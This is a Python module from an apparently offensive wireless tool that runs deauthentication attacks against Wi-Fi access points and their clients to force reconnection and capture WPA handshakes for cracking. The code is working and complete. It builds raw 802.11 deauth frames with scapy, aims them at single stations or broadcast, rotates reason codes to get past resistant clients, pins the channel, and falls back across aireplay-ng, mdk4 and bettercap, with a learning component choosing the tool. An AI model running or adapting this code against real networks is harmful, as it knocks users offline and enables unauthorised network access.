"""Strategic deauthentication executor.

Deauth is aimed, timed, and rotated — not sprayed:

* **Client targeting** — when the analyzer identifies an active client, deauth is
  aimed at that station (its MAC is used for ``-c``/``-S``) so the client
  reconnects and re-runs the 4-way handshake in front of our sniffer.
* **Reason-code rotation** — deauth/disassoc reason codes are cycled (7, 4, 1)
  because some clients/APs ignore specific codes. Reason codes are honoured for
  real on the wire via scapy raw-frame injection (when scapy is installed);
  otherwise the tool's native reason is used.
* **Single-engine campaign with fallback** — exactly one deauth engine runs per
  campaign (the first installed one in the chain). A missing engine triggers
  fallback to the next; engines are NOT run concurrently or sequentially
  against the same target (which would over-deauth).
* **Channel pinning** — the interface is pinned to the target channel via ``iw``
  before deauth so mdk4/bettercap do not hop away.

Reason codes (IEEE 802.11-2020 §9.4.1.7 / §9.6.3.3):
  1 = Unspecified, 4 = Disassociated (AP overloaded/leaving), 7 = Class-3 frame
  from non-associated station (the classic "kick").
"""

from __future__ import annotations

import logging
import time

from ..exceptions import ToolNotFoundError
from ..learning.state import ActionKey
from ..tools.registry import ToolRegistry
from ..utils.proc import ProcResult

log = logging.getLogger("handshaker.deauth")

# Deauth engines understood by this module. "scapy" is a Python library, not a
# binary, so it is detected separately from the PATH-based tool registry.
_SCAPY_TOOLS = {"scapy"}


def scapy_available() -> bool:
    """True if scapy is importable (used for raw-frame deauth injection).

    Uses ``importlib.util.find_spec`` so we only *check* for scapy without
    actually importing it (importing scapy is slow and has side effects).
    """
    import importlib.util
    return importlib.util.find_spec("scapy") is not None


def reason_supported(tool: str) -> bool:
    """Whether a deauth engine honours an arbitrary reason code on the wire.

    Only scapy crafts frames with a chosen reason code; aireplay-ng/mdk4/
    bettercap use their own native reason. This capability fact keeps the
    learning action-space honest: ``reason`` is only a *causal* parameter for
    scapy, so it is only varied (and learned) for that engine.
    """
    return tool == "scapy"


class Deauther:
    def __init__(self, registry: ToolRegistry, config: dict) -> None:
        self.registry = registry
        self.config = config["deauth"]
        self._scapy = scapy_available()

    # ------------------------------------------------------------------ #
    def tool_available(self, tool: str) -> bool:
        """Is a given deauth tool actually usable right now?"""
        if tool in _SCAPY_TOOLS:
            return self._scapy
        return self.registry.has(tool)

    def pin_channel(self, interface: str, channel: int) -> None:
        """Pin the monitor interface to the target channel (via iw / iwconfig)."""
        if self.registry.has("iw"):
            self.registry.iw().set_channel(interface, str(channel))
        elif self.registry.has("iwconfig"):
            self.registry.iwconfig().set_channel(interface, str(channel))

    # ------------------------------------------------------------------ #
    def execute(
        self,
        interface: str,
        bssid: str,
        action: ActionKey,
        *,
        client: str | None = None,
    ) -> ProcResult:
        """Execute one deauth action; returns the tool's raw result.

        ``action.reason`` is honoured for real only by the scapy engine (which
        crafts frames with an arbitrary reason code). aireplay-ng / mdk4 /
        bettercap use their native reason codes.
        """
        tool = action.tool
        burst = action.burst

        if tool == "scapy":
            return self._scapy_deauth(interface, bssid, client=client,
                                      count=burst, reason=action.reason)
        if tool == "aireplay-ng":
            return self.registry.aireplay().deauth(
                interface, bssid=bssid, count=burst, client=client
            )
        if tool == "mdk4":
            return self.registry.mdk4().deauth(
                interface, bssid=bssid, count=burst, client=client
            )
        if tool == "bettercap":
            return self.registry.bettercap().caplet_deauth(
                interface, bssid, client or "*", count=burst
            )
        raise ToolNotFoundError(tool)

    def _scapy_deauth(
        self,
        interface: str,
        bssid: str,
        *,
        client: str,
        count: int,
        reason: int,
    ) -> ProcResult:
        """Send raw 802.11 deauth frames with an arbitrary reason code via scapy.

        This is the only engine that honours ``action.reason`` on the wire.
        Requires scapy to be installed; raises ToolNotFoundError otherwise.
        """
        if not self._scapy:
            raise ToolNotFoundError("scapy")
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

        dst = client if client else "ff:ff:ff:ff:ff:ff"
        pkts = []
        for _ in range(max(1, count)):
            # AP → STA (or broadcast). Some clients ignore AP-originated deauth
            # unless they also see the reverse STA → AP frame (aireplay-ng
            # sends both).
            pkts.append(RadioTap() / Dot11(
                addr1=dst, addr2=bssid, addr3=bssid,
                type=0, subtype=12,  # management / deauthentication
            ) / Dot11Deauth(reason=reason))
            if client:
                pkts.append(RadioTap() / Dot11(
                    addr1=bssid, addr2=client, addr3=bssid,
                    type=0, subtype=12,
                ) / Dot11Deauth(reason=reason))
        sendp(pkts, iface=interface, verbose=0)
        return ProcResult(
            args=["scapy", "deauth", bssid],
            returncode=0,
            stdout=f"sent {len(pkts)} deauth frames reason={reason}",
        )

    # ------------------------------------------------------------------ #
    def campaign(
        self,
        interface: str,
        bssid: str,
        action: ActionKey,
        *,
        client: str | None = None,
        channel: int | None = None,
        max_bursts: int | None = None,
        fallback_tools: list[str] | None = None,
    ) -> list[ProcResult]:
        """Run a deauth campaign with **failure-based fallback**.

        Engines are tried in chain order. An engine that is missing is skipped;
        an engine that *runs but fails* (non-zero exit / timeout) is abandoned
        and the next engine is tried — this is true *failure* fallback, not just
        availability fallback. Only successful bursts are returned, so the
        caller's ``len(results)`` reflects real, successful deauth work.

        Reason codes rotate across bursts for the current engine; only scapy
        actually honours the code on the wire (see ``reason_supported``).
        """
        max_bursts = max_bursts or int(self.config["max_bursts"])
        cooldown = float(self.config["cooldown"])
        reasons = [int(r) for r in self.config["reason_codes"]] or [7]
        if channel is not None:
            self.pin_channel(interface, channel)

        # The bandit's chosen tool is authoritative: try it FIRST, then the rest
        # of the chain as *fallback*. (Previously the full chain was passed as
        # fallback_tools, which silently ignored the learned tool and always
        # started from the first configured engine — making the tool dimension
        # of the action space learned but never acted upon.)
        chain = [action.tool] + [t for t in (fallback_tools or []) if t != action.tool]
        results: list[ProcResult] = []

        for engine in chain:
            if not self.tool_available(engine):
                log.info("deauth engine %s unavailable; trying next", engine)
                continue

            engine_succeeded = False
            engine_failed = False
            for i in range(max_bursts):
                cur = ActionKey(engine, action.burst, reasons[i % len(reasons)])
                log.info(
                    "deauth burst %d/%d -> %s (engine=%s burst=%d reason=%d client=%s)",
                    i + 1, max_bursts, bssid, engine, action.burst, cur.reason, client or "*",
                )
                try:
                    res = self.execute(interface, bssid, cur, client=client)
                except ToolNotFoundError as exc:
                    log.warning("%s; skipping engine %s", exc, engine)
                    break
                if res.ok:
                    results.append(res)
                    engine_succeeded = True
                else:
                    log.warning(
                        "deauth engine %s failed (rc=%d timed_out=%s): %s",
                        engine, res.returncode, res.timed_out,
                        res.output[:160].replace("\n", " "),
                    )
                    engine_failed = True
                    break
                if i < max_bursts - 1:
                    time.sleep(cooldown)

            # If this engine completed bursts without failing, the campaign is
            # done; otherwise fall through to the next engine in the chain.
            if engine_succeeded and not engine_failed:
                break

        if not results:
            log.warning("no deauth engine completed a successful burst for %s", bssid)
        return results

    # Backwards-compatible alias.
    def attack(self, interface: str, bssid: str, action: ActionKey,
               *, client: str | None = None, max_bursts: int | None = None) -> list[ProcResult]:
        return self.campaign(interface, bssid, action, client=client,
                             max_bursts=max_bursts)
